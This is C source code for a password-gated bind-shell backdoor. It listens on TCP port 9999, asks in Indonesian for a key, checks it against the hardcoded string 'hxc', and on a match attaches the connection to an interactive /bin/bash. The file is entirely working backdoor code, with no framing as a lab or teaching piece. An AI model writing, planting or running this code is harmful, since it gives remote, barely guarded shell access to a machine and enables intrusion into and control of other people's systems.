#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>

#define PORT 9999
#define SECRET "hxc"
#define MAX_CLIENTS 10

void trim_newline(char *str) {
    char *p = strchr(str, '\n');
    if (p) *p = '\0';
}

int main() {
    int sockfd, client_sock;
    struct sockaddr_in server, client;
    socklen_t client_len = sizeof(client);
    fd_set read_fds, master_fds;
    int max_fd, client_fds[MAX_CLIENTS] = {0};

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Bind error");
        exit(1);
    }

    if (listen(sockfd, 5) < 0) {
        perror("Listen error");
        exit(1);
    }

    printf("[*] Listening on port %d...\n", PORT);

    FD_ZERO(&master_fds);
    FD_SET(sockfd, &master_fds);
    max_fd = sockfd;

    while (1) {
        read_fds = master_fds;
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            perror("Select error");
            continue;
        }

        for (int i = 0; i <= max_fd; i++) {
            if (!FD_ISSET(i, &read_fds)) continue;

            if (i == sockfd) {
                client_sock = accept(sockfd, (struct sockaddr *)&client, &client_len);
                if (client_sock < 0) {
                    perror("Accept error");
                    continue;
                }
                for (int j = 0; j < MAX_CLIENTS; j++) {
                    if (client_fds[j] == 0) {
                        client_fds[j] = client_sock;
                        FD_SET(client_sock, &master_fds);
                        if (client_sock > max_fd) max_fd = client_sock;
                        write(client_sock, "Masukkan key: ", strlen("Masukkan key: "));
                        break;
                    }
                }
            } else {
                char buffer[1024];
                int len = read(i, buffer, sizeof(buffer) - 1);
                if (len <= 0) {
                    close(i);
                    FD_CLR(i, &master_fds);
                    for (int j = 0; j < MAX_CLIENTS; j++) {
                        if (client_fds[j] == i) client_fds[j] = 0;
                    }
                    continue;
                }

                buffer[len] = '\0';
                trim_newline(buffer);

                if (strncmp(buffer, SECRET, strlen(SECRET)) == 0) {
                    write(i, "Akses diterima. Masuk shell...\n", 32);
                    dup2(i, 0);
                    dup2(i, 1);
                    dup2(i, 2);
                    execl("/bin/bash", "bash", "-i", NULL);
                    perror("execl failed");
                    exit(1);
                } else {
                    write(i, "Key salah. Bye.\n", 16);
                    close(i);
                    FD_CLR(i, &master_fds);
                    for (int j = 0; j < MAX_CLIENTS; j++) {
                        if (client_fds[j] == i) client_fds[j] = 0;
                    }
                }
            }
        }
    }

    close(sockfd);
    return 0;
}
